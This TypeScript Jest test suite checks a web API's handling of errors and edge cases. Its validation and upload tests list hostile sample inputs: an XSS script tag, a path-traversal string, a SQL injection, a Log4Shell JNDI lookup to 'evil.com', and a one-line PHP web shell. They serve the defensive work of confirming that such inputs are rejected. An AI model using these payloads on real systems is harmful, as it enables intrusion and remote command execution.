/**
 * Comprehensive Error Handling and Edge Case Test Suite
 * Tests all error categories and boundary conditions across system components
 */

import { describe, test, expect, beforeEach, afterEach } from '@jest/globals';
import request from 'supertest';
import App from '../../src/server/app.js';
import {
  ValidationError,
  AuthenticationError,
  DatabaseError,
  ExternalServiceError,
  CognitiveProcessingError,
  RateLimitError
} from '../../src/server/middleware/errorHandler';

describe('Comprehensive Error Handling Tests', () => {
  let app: App;

  beforeAll(async () => {
    app = new App();
    await app.start();
  });

  afterAll(async () => {
    if (app) {
      await app.stop();
    }
  });

  describe('Input Validation Errors', () => {
    describe('API Endpoint Input Validation', () => {
      test('should handle invalid JSON in request body', async () => {
        const response = await request(app.app)
          .post('/api/conversations')
          .set('Content-Type', 'application/json')
          .send('{"invalid": json}');

        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('code', 'VALIDATION_ERROR');
        expect(response.body).toHaveProperty('message');
        expect(response.body).toHaveProperty('timestamp');
      });

      test('should handle missing required fields', async () => {
        const response = await request(app.app)
          .post('/api/conversations')
          .send({}); // Empty body missing required fields

        expect(response.status).toBe(400);
        expect(response.body.code).toBe('VALIDATION_ERROR');
      });

      test('should handle invalid data types', async () => {
        const response = await request(app.app)
          .post('/api/conversations')
          .send({
            title: 123, // Should be string
            messages: 'not an array', // Should be array
            metadata: null // Should be object
          });

        expect(response.status).toBe(400);
        expect(response.body.code).toBe('VALIDATION_ERROR');
      });

      test('should handle out-of-range values', async () => {
        const response = await request(app.app)
          .post('/api/analysis')
          .send({
            confidence: 1.5, // Should be 0-1
            threshold: -0.1, // Should be positive
            iterations: 1000000 // Exceeds maximum
          });

        expect(response.status).toBe(400);
        expect(response.body.code).toBe('VALIDATION_ERROR');
      });

      test('should handle malicious input patterns', async () => {
        const maliciousInputs = [
          '<script>alert("xss")</script>',
          '../../etc/passwd',
          'SELECT * FROM users; DROP TABLE users;--',
          '${jndi:ldap://evil.com/a}',
          '\x00\x01\x02\x03',
          'A'.repeat(10000) // Buffer overflow attempt
        ];

        for (const input of maliciousInputs) {
          const response = await request(app.app)
            .post('/api/conversations')
            .send({
              title: input,
              content: input
            });

          // Should either accept and sanitize or reject
          expect([400, 422, 200]).toContain(response.status);
          if (response.status >= 400) {
            expect(response.body.code).toMatch(/VALIDATION_ERROR|SECURITY_ERROR/);
          }
        }
      });

      test('should handle Unicode and encoding issues', async () => {
        const unicodeInputs = [
          '🚀🔥💻', // Emojis
          '中文测试', // Chinese characters
          'العربية', // Arabic text
          'עברית', // Hebrew text
          'ñáéíóú', // Accented characters
          '\u0000\u0001\u0002', // Control characters
          '\uD83D\uDE00' // Unicode surrogate pairs
        ];

        for (const input of unicodeInputs) {
          const response = await request(app.app)
            .post('/api/conversations')
            .send({
              title: input,
              content: input
            });

          expect([200, 400, 422]).toContain(response.status);
        }
      });

      test('should handle extremely large payloads', async () => {
        const largePayload = {
          title: 'A'.repeat(1024 * 1024), // 1MB string
          content: 'B'.repeat(10 * 1024 * 1024), // 10MB string
          metadata: Array(100000).fill({ item: 'data'.repeat(100) })
        };

        const response = await request(app.app)
          .post('/api/conversations')
          .send(largePayload)
          .timeout(30000);

        expect([400, 413, 422]).toContain(response.status);
      });

      test('should handle null and undefined values', async () => {
        const response = await request(app.app)
          .post('/api/conversations')
          .send({
            title: null,
            content: undefined,
            metadata: null,
            tags: [null, undefined, 'valid-tag']
          });

        expect(response.status).toBe(400);
        expect(response.body.code).toBe('VALIDATION_ERROR');
      });
    });

    describe('File Upload Validation', () => {
      test('should reject files exceeding size limit', async () => {
        const largeBuffer = Buffer.alloc(1024 * 1024 * 200); // 200MB

        const response = await request(app.app)
          .post('/api/upload')
          .attach('file', largeBuffer, 'large-file.txt');

        expect([400, 413]).toContain(response.status);
      });

      test('should reject malicious file types', async () => {
        const maliciousFiles = [
          { name: 'malware.exe', content: Buffer.from('fake executable') },
          { name: 'script.js', content: Buffer.from('<script>alert("xss")</script>') },
          { name: '../../etc/passwd', content: Buffer.from('root:x:0:0') },
          { name: 'file.php', content: Buffer.from('<?php system($_GET["cmd"]); ?>') }
        ];

        for (const file of maliciousFiles) {
          const response = await request(app.app)
            .post('/api/upload')
            .attach('file', file.content, file.name);

          expect([400, 422]).toContain(response.status);
        }
      });

      test('should handle corrupted file uploads', async () => {
        const corruptedContent = Buffer.from([0xFF, 0xFE, 0xFD, 0xFC, 0xFB]);

        const response = await request(app.app)
          .post('/api/upload')
          .attach('file', corruptedContent, 'corrupted.bin');

        expect([400, 422, 500]).toContain(response.status);
      });
    });
  });

  describe('Database Errors', () => {
    test('should handle database connection failures', async () => {
      // Mock database connection failure
      const originalEnv = process.env.DB_HOST;
      process.env.DB_HOST = 'nonexistent-host';

      try {
        const response = await request(app.app)
          .get('/api/conversations');

        expect([500, 503]).toContain(response.status);
        expect(response.body.code).toMatch(/DATABASE_ERROR|SERVICE_UNAVAILABLE/);
      } finally {
        process.env.DB_HOST = originalEnv;
      }
    });

    test('should handle database query timeouts', async () => {
      // Mock long-running query
      const response = await request(app.app)
        .get('/api/conversations')
        .query({ timeout: 100 });

      expect([408, 500]).toContain(response.status);
    });

    test('should handle constraint violations', async () => {
      const duplicateData = {
        id: 'duplicate-id',
        title: 'Test Conversation'
      };

      // First request should succeed
      const firstResponse = await request(app.app)
        .post('/api/conversations')
        .send(duplicateData);

      expect([200, 201]).toContain(firstResponse.status);

      // Second request with same ID should fail
      const secondResponse = await request(app.app)
        .post('/api/conversations')
        .send(duplicateData);

      expect([409, 400]).toContain(secondResponse.status);
    });

    test('should handle database connection pool exhaustion', async () => {
      const promises = Array(100).fill(null).map(() =>
        request(app.app).get('/api/conversations')
      );

      const responses = await Promise.all(promises);
      const errorResponses = responses.filter(res => res.status >= 500);

      expect(errorResponses.length).toBeGreaterThan(0);
      expect(errorResponses[0].body.code).toMatch(/DATABASE_ERROR|RATE_LIMIT_ERROR/);
    });
  });

  describe('Network Errors', () => {
    test('should handle request timeouts', async () => {
      const response = await request(app.app)
        .post('/api/analysis')
        .send({ data: 'A'.repeat(1000000) }) // Large payload
        .timeout(1000);

      expect([408, 400, 500]).toContain(response.status);
    });

    test('should handle connection refused scenarios', async () => {
      // Try to connect to a port that's not listening
      const response = await request('http://localhost:9999')
        .get('/api/health');

      expect(response.status).toBeGreaterThanOrEqual(400);
    });

    test('should handle DNS resolution failures', async () => {
      const response = await request(app.app)
        .post('/api/external-service')
        .send({ url: 'http://nonexistent-domain-12345.com/api' });

      expect([500, 502, 503]).toContain(response.status);
      expect(response.body.code).toMatch(/EXTERNAL_SERVICE_ERROR|NETWORK_ERROR/);
    });

    test('should handle slow network conditions', async () => {
      const slowData = {
        data: Array(10000).fill({ item: 'large data object' })
      };

      const startTime = Date.now();
      const response = await request(app.app)
        .post('/api/analysis')
        .send(slowData)
        .timeout(30000);
      const endTime = Date.now();

      expect(endTime - startTime).toBeGreaterThan(1000);
      expect([200, 408, 500]).toContain(response.status);
    });
  });

  describe('Authentication and Authorization Errors', () => {
    test('should handle missing authentication tokens', async () => {
      const response = await request(app.app)
        .get('/api/auth/profile');

      expect(response.status).toBe(401);
      expect(response.body.code).toBe('AUTHENTICATION_ERROR');
    });

    test('should handle invalid authentication tokens', async () => {
      const invalidTokens = [
        'invalid-token',
        'Bearer invalid',
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
        '',
        'null',
        'undefined'
      ];

      for (const token of invalidTokens) {
        const response = await request(app.app)
          .get('/api/auth/profile')
          .set('Authorization', `Bearer ${token}`);

        expect(response.status).toBe(401);
        expect(response.body.code).toBe('AUTHENTICATION_ERROR');
      }
    });

    test('should handle expired authentication tokens', async () => {
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxNjE2MjM5MDIyfQ.invalid';

      const response = await request(app.app)
        .get('/api/auth/profile')
        .set('Authorization', `Bearer ${expiredToken}`);

      expect(response.status).toBe(401);
      expect(response.body.code).toBe('AUTHENTICATION_ERROR');
    });

    test('should handle insufficient permissions', async () => {
      // Authenticate as regular user
      const authResponse = await request(app.app)
        .post('/api/auth/login')
        .send({ username: 'user', password: 'password' });

      const token = authResponse.body.token;

      // Try to access admin endpoint
      const response = await request(app.app)
        .delete('/api/admin/users/123')
        .set('Authorization', `Bearer ${token}`);

      expect(response.status).toBe(403);
      expect(response.body.code).toBe('AUTHORIZATION_ERROR');
    });

    test('should handle concurrent authentication attempts', async () => {
      const promises = Array(10).fill(null).map(() =>
        request(app.app)
          .post('/api/auth/login')
          .send({ username: 'test', password: 'wrong-password' })
      );

      const responses = await Promise.all(promises);
      responses.forEach(response => {
        expect([401, 429]).toContain(response.status);
      });
    });
  });

  describe('Resource Exhaustion', () => {
    test('should handle memory pressure', async () => {
      const memoryIntensiveData = {
        data: Array(100000).fill({
          content: 'A'.repeat(1000),
          nested: Array(100).fill({ deep: 'data'.repeat(100) })
        })
      };

      const response = await request(app.app)
        .post('/api/analysis')
        .send(memoryIntensiveData);

      expect([400, 413, 500, 507]).toContain(response.status);
    });

    test('should handle CPU saturation', async () => {
      const cpuIntensiveTask = {
        algorithm: 'complex-calculation',
        iterations: 1000000000,
        complexity: 'exponential'
      };

      const response = await request(app.app)
        .post('/api/analysis')
        .send(cpuIntensiveTask)
        .timeout(60000);

      expect([408, 500, 503]).toContain(response.status);
    });

    test('should handle connection limit exhaustion', async () => {
      const connections = Array(1000).fill(null).map((_, index) =>
        request(app.app)
          .get('/api/health')
          .set('Connection', `keep-alive-${index}`)
      );

      const responses = await Promise.allSettled(connections);
      const rejected = responses.filter(r => r.status === 'rejected' ||
        (r.status === 'fulfilled' && r.value.status >= 500));

      expect(rejected.length).toBeGreaterThan(0);
    });

    test('should handle rate limiting', async () => {
      const requests = Array(100).fill(null).map(() =>
        request(app.app).get('/api/health')
      );

      const responses = await Promise.all(requests);
      const rateLimited = responses.filter(res => res.status === 429);

      expect(rateLimited.length).toBeGreaterThan(0);
      expect(rateLimited[0].body.code).toBe('RATE_LIMIT_ERROR');
    });
  });

  describe('Configuration Errors', () => {
    test('should handle missing environment variables', async () => {
      const originalEnv = { ...process.env };

      // Remove critical environment variables
      delete process.env.DB_HOST;
      delete process.env.JWT_SECRET;

      try {
        const response = await request(app.app)
          .get('/api/health');

        expect([500, 503]).toContain(response.status);
      } finally {
        process.env = originalEnv;
      }
    });

    test('should handle invalid configuration values', async () => {
      const originalEnv = process.env.NODE_ENV;
      process.env.NODE_ENV = 'invalid-env';

      try {
        const response = await request(app.app)
          .get('/api/health');

        expect([500, 400]).toContain(response.status);
      } finally {
        process.env.NODE_ENV = originalEnv;
      }
    });

    test('should handle database configuration errors', async () => {
      const originalHost = process.env.DB_HOST;
      process.env.DB_HOST = 'invalid-host';
      process.env.DB_PORT = '99999';

      try {
        const response = await request(app.app)
          .get('/api/conversations');

        expect([500, 503]).toContain(response.status);
        expect(response.body.code).toMatch(/DATABASE_ERROR|CONFIG_ERROR/);
      } finally {
        process.env.DB_HOST = originalHost;
      }
    });
  });

  describe('External Service Dependencies', () => {
    test('should handle external API timeouts', async () => {
      const response = await request(app.app)
        .post('/api/analysis/external')
        .send({
          service: 'slow-api',
          timeout: 100
        });

      expect([408, 502, 504]).toContain(response.status);
    });

    test('should handle external API failures', async () => {
      const response = await request(app.app)
        .post('/api/analysis/external')
        .send({
          service: 'failing-api',
          endpoint: 'https://httpstat.us/500'
        });

      expect([502, 503, 504]).toContain(response.status);
      expect(response.body.code).toBe('EXTERNAL_SERVICE_ERROR');
    });

    test('should handle external API rate limiting', async () => {
      const response = await request(app.app)
        .post('/api/analysis/external')
        .send({
          service: 'rate-limited-api',
          endpoint: 'https://httpstat.us/429'
        });

      expect([429, 502, 503]).toContain(response.status);
    });

    test('should handle malformed external API responses', async () => {
      const response = await request(app.app)
        .post('/api/analysis/external')
        .send({
          service: 'malformed-response-api',
          endpoint: 'https://httpstat.us/200'
        });

      // Should handle gracefully or return appropriate error
      expect([200, 422, 502]).toContain(response.status);
    });
  });

  describe('Boundary Conditions', () => {
    test('should handle zero values', async () => {
      const response = await request(app.app)
        .post('/api/analysis')
        .send({
          confidence: 0,
          threshold: 0,
          iterations: 0,
          items: []
        });

      expect([200, 400]).toContain(response.status);
    });

    test('should handle maximum values', async () => {
      const response = await request(app.app)
        .post('/api/analysis')
        .send({
          confidence: 1,
          threshold: Number.MAX_SAFE_INTEGER,
          iterations: Number.MAX_SAFE_INTEGER
        });

      expect([200, 400, 413]).toContain(response.status);
    });

    test('should handle empty inputs', async () => {
      const emptyInputs = [
        {},
        { title: '', content: '' },
        { items: [] },
        { data: null },
        { config: undefined }
      ];

      for (const input of emptyInputs) {
        const response = await request(app.app)
          .post('/api/conversations')
          .send(input);

        expect([400, 422]).toContain(response.status);
      }
    });

    test('should handle single character inputs', async () => {
      const response = await request(app.app)
        .post('/api/conversations')
        .send({
          title: 'a',
          content: 'b'
        });

      expect([200, 400]).toContain(response.status);
    });

    test('should handle boundary date values', async () => {
      const boundaryDates = [
        new Date('1970-01-01T00:00:00.000Z'),
        new Date('2038-01-19T03:14:07.000Z'),
        new Date('9999-12-31T23:59:59.999Z')
      ];

      for (const date of boundaryDates) {
        const response = await request(app.app)
          .post('/api/conversations')
          .send({
            title: 'Test',
            createdAt: date.toISOString()
          });

        expect([200, 400]).toContain(response.status);
      }
    });
  });

  describe('Concurrent Access', () => {
    test('should handle simultaneous requests to same resource', async () => {
      const resourceId = 'test-resource-123';
      const promises = Array(10).fill(null).map((_, index) =>
        request(app.app)
          .put(`/api/conversations/${resourceId}`)
          .send({
            title: `Updated Title ${index}`,
            timestamp: Date.now()
          })
      );

      const responses = await Promise.all(promises);
      const successCount = responses.filter(res => res.status === 200).length;
      const conflictCount = responses.filter(res => res.status === 409).length;

      expect(successCount + conflictCount).toBe(10);
    });

    test('should handle race conditions in data creation', async () => {
      const sameData = {
        title: 'Duplicate Title',
        uniqueId: 'same-unique-id'
      };

      const promises = Array(5).fill(null).map(() =>
        request(app.app)
          .post('/api/conversations')
          .send(sameData)
      );

      const responses = await Promise.all(promises);
      const successCount = responses.filter(res => [200, 201].includes(res.status)).length;
      const conflictCount = responses.filter(res => res.status === 409).length;

      expect(successCount).toBe(1); // Only one should succeed
      expect(conflictCount).toBe(4); // Rest should get conflict
    });

    test('should handle deadlocks', async () => {
      // Create competing transactions that could deadlock
      const transaction1 = request(app.app)
        .post('/api/transactions')
        .send({ resources: ['resource1', 'resource2'], operations: ['lock', 'update'] });

      const transaction2 = request(app.app)
        .post('/api/transactions')
        .send({ resources: ['resource2', 'resource1'], operations: ['lock', 'update'] });

      const [response1, response2] = await Promise.all([transaction1, transaction2]);

      // At least one should succeed or both should handle deadlock gracefully
      expect([200, 409, 500, 503]).toContain(response1.status);
      expect([200, 409, 500, 503]).toContain(response2.status);
    });
  });

  describe('Data Corruption and Encoding', () => {
    test('should handle malformed JSON', async () => {
      const malformedJsons = [
        '{"unclosed": "string"',
        '{"invalid": "quotes"}',
        '{"missing": "value",}',
        '{invalid json}',
        'null',
        'undefined',
        '12345',
        '"just a string"'
      ];

      for (const json of malformedJsons) {
        const response = await request(app.app)
          .post('/api/conversations')
          .set('Content-Type', 'application/json')
          .send(json);

        expect(response.status).toBe(400);
        expect(response.body.code).toBe('VALIDATION_ERROR');
      }
    });

    test('should handle encoding issues', async () => {
      const encodingIssues = [
        Buffer.from([0xFF, 0xFE, 0x20, 0x4D]), // UTF-16 with BOM
        Buffer.from([0xC0, 0x80]), // Overlong UTF-8 encoding
        Buffer.from([0xED, 0xA0, 0x80]), // Surrogate pair
        Buffer.from([0x80, 0x81, 0x82]), // Invalid UTF-8
      ];

      for (const data of encodingIssues) {
        const response = await request(app.app)
          .post('/api/conversations')
          .set('Content-Type', 'application/json')
          .send(data);

        expect([400, 422]).toContain(response.status);
      }
    });

    test('should handle truncated data', async () => {
      const incompleteData = '{"title":"Test","content":"This data is in'; // Missing closing brackets

      const response = await request(app.app)
        .post('/api/conversations')
        .set('Content-Type', 'application/json')
        .send(incompleteData);

      expect(response.status).toBe(400);
    });

    test('should handle data with null bytes', async () => {
      const dataWithNulls = {
        title: 'Test\x00\x00Data',
        content: 'Content\x00with\x00nulls',
        metadata: { key: 'value\x00malicious' }
      };

      const response = await request(app.app)
        .post('/api/conversations')
        .send(dataWithNulls);

      expect([200, 400]).toContain(response.status);
    });
  });

  describe('Network Partition Scenarios', () => {
    test('should handle intermittent connectivity', async () => {
      // Simulate intermittent failures
      const responses = [];

      for (let i = 0; i < 10; i++) {
        const response = await request(app.app)
          .get('/api/health')
          .set('X-Simulate-Failure', i % 3 === 0 ? 'true' : 'false');

        responses.push(response.status);
      }

      // Should have both successes and failures
      expect(new Set(responses).size).toBeGreaterThan(1);
      expect([200, 500, 503]).toEqual(expect.arrayContaining(responses));
    });

    test('should handle partial service availability', async () => {
      const response = await request(app.app)
        .get('/api/health')
        .set('X-Service-Status', 'partial');

      expect([200, 503]).toContain(response.status);
      if (response.status === 200) {
        expect(response.body.services).toBeDefined();
        expect(response.body.services.some((s: any) => s.status !== 'connected')).toBe(true);
      }
    });

    test('should handle slow cascade failures', async () => {
      // First request triggers dependency failure
      const firstResponse = await request(app.app)
        .post('/api/analysis/cascade')
        .send({ triggerFailure: true });

      // Subsequent requests should handle degraded state
      const subsequentResponses = await Promise.all(
        Array(5).fill(null).map(() =>
          request(app.app).get('/api/health')
        )
      );

      const degradedResponses = subsequentResponses.filter(res =>
        [503, 200].includes(res.status)
      );

      expect(degradedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Time-based Issues', () => {
    test('should handle timezone edge cases', async () => {
      const timezoneDates = [
        '2023-12-31T23:59:59.999Z', // Year end UTC
        '2023-06-21T12:00:00.000+14:00', // Earliest timezone
        '2023-06-21T12:00:00.000-12:00', // Latest timezone
        '2023-11-05T01:30:00.000-05:00', // DST transition
        '2024-02-29T23:59:59.999Z' // Leap year
      ];

      for (const dateStr of timezoneDates) {
        const response = await request(app.app)
          .post('/api/conversations')
          .send({
            title: 'Timezone Test',
            createdAt: dateStr
          });

        expect([200, 400]).toContain(response.status);
      }
    });

    test('should handle clock skew', async () => {
      const pastTimestamp = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(); // 1 hour ago
      const futureTimestamp = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString(); // 1 hour from now

      const pastResponse = await request(app.app)
        .post('/api/conversations')
        .send({
          title: 'Past Timestamp',
          createdAt: pastTimestamp
        });

      const futureResponse = await request(app.app)
        .post('/api/conversations')
        .send({
          title: 'Future Timestamp',
          createdAt: futureTimestamp
        });

      expect([200, 400, 422]).toContain(pastResponse.status);
      expect([200, 400, 422]).toContain(futureResponse.status);
    });

    test('should handle leap year and date boundary issues', async () => {
      const boundaryDates = [
        '2024-02-29T00:00:00.000Z', // Leap day
        '2023-02-28T23:59:59.999Z', // Non-leap Feb end
        '2024-03-01T00:00:00.000Z', // Day after leap day
        '1999-12-31T23:59:59.999Z', // Y2K eve
        '2000-01-01T00:00:00.000Z'  // Y2K day
      ];

      for (const date of boundaryDates) {
        const response = await request(app.app)
          .post('/api/conversations')
          .send({
            title: 'Boundary Date Test',
            createdAt: date
          });

        expect([200, 400]).toContain(response.status);
      }
    });
  });

  describe('Abnormal User Behavior', () => {
    test('should handle rapid clicking/duplicate requests', async () => {
      const sameRequest = {
        title: 'Rapid Click Test',
        content: 'Testing duplicate request handling'
      };

      const promises = Array(10).fill(null).map(() =>
        request(app.app)
          .post('/api/conversations')
          .send(sameRequest)
      );

      const responses = await Promise.all(promises);
      const deduplicationCount = responses.filter(res =>
        res.body.message?.includes('duplicate') || res.status === 409
      ).length;

      expect(deduplicationCount).toBeGreaterThan(0);
    });

    test('should handle browser back button scenarios', async () => {
      // Simulate navigating back and resubmitting form
      const formData = {
        title: 'Back Button Test',
        content: 'Testing back button resubmission'
      };

      const firstResponse = await request(app.app)
        .post('/api/conversations')
        .send(formData);

      // Simulate back button resubmission
      const secondResponse = await request(app.app)
        .post('/api/conversations')
        .send({ ...formData, resubmitted: true });

      expect([200, 201, 409]).toContain(firstResponse.status);
      expect([200, 201, 409, 400]).toContain(secondResponse.status);
    });

    test('should handle session fixation attempts', async () => {
      const maliciousSessionId = 'malicious-session-id-123';

      const response = await request(app.app)
        .get('/api/auth/profile')
        .set('Cookie', `sessionId=${maliciousSessionId}`);

      expect([401, 403, 400]).toContain(response.status);
    });

    test('should handle parameter pollution', async () => {
      const response = await request(app.app)
        .get('/api/conversations')
        .query({
          id: ['123', '456', '789'],
          title: ['title1', 'title2'],
          limit: ['10', '20', 'invalid']
        });

      expect([200, 400]).toContain(response.status);
    });

    test('should handle HTTP method tampering', async () => {
      const response = await request(app.app)
        .post('/api/conversations')
        .set('X-HTTP-Method-Override', 'DELETE')
        .send({ id: '123' });

      expect([400, 405, 404]).toContain(response.status);
    });
  });

  describe('Error Recovery and Resilience', () => {
    test('should recover from temporary database failures', async () => {
      // Simulate temporary database failure
      await request(app.app)
        .post('/api/admin/simulate-db-failure')
        .send({ duration: 2000 });

      // Requests during failure should handle gracefully
      const failResponse = await request(app.app)
        .get('/api/conversations');

      expect([500, 503]).toContain(failResponse.status);

      // Wait for recovery
      await new Promise(resolve => setTimeout(resolve, 3000));

      // Requests after recovery should succeed
      const recoverResponse = await request(app.app)
        .get('/api/conversations');

      expect([200, 503]).toContain(recoverResponse.status);
    });

    test('should implement circuit breaker pattern', async () => {
      // Trigger multiple failures to open circuit
      const failurePromises = Array(5).fill(null).map(() =>
        request(app.app)
          .post('/api/external-service')
          .send({ service: 'failing-service' })
      );

      const failureResponses = await Promise.all(failurePromises);

      // Later requests should fail fast due to open circuit
      const circuitOpenResponse = await request(app.app)
        .post('/api/external-service')
        .send({ service: 'any-service' });

      expect([503, 502]).toContain(circuitOpenResponse.status);
    });

    test('should implement graceful degradation', async () => {
      const response = await request(app.app)
        .get('/api/health')
        .set('X-Simulate-Partial-Failure', 'true');

      expect(response.status).toBe(200);
      expect(response.body.status).toBe('degraded');
      expect(response.body.availableServices).toBeLessThan(response.body.totalServices);
    });

    test('should provide fallback responses', async () => {
      const response = await request(app.app)
        .get('/api/conversations')
        .set('X-Fallback-Mode', 'true');

      expect([200, 503]).toContain(response.status);
      if (response.status === 200) {
        expect(response.body.data).toEqual([]);
        expect(response.body.fallback).toBe(true);
      }
    });
  });

  describe('Error Logging and Monitoring', () => {
    test('should log errors with appropriate context', async () => {
      const response = await request(app.app)
        .post('/api/conversations')
        .send({ invalid: 'data' });

      expect(response.status).toBe(400);

      // In a real implementation, you'd verify that logs were created
      // This is a placeholder for log verification
      expect(response.body.requestId).toBeDefined();
      expect(response.body.timestamp).toBeDefined();
    });

    test('should not leak sensitive information in error responses', async () => {
      const responses = [
        await request(app.app).get('/api/nonexistent'),
        await request(app.app).post('/api/conversations').send({}),
        await request(app.app).get('/api/admin/system-info')
      ];

      responses.forEach(response => {
        expect(response.body).not.toHaveProperty('stack');
        expect(response.body).not.toHaveProperty('databasePassword');
        expect(response.body).not.toHaveProperty('jwtSecret');
        expect(response.body).not.toHaveProperty('internalPath');
      });
    });

    test('should provide correlation IDs for error tracking', async () => {
      const correlationId = 'test-correlation-123';

      const response = await request(app.app)
        .get('/api/nonexistent')
        .set('X-Request-ID', correlationId);

      expect(response.body.requestId).toBe(correlationId);
    });
  });
});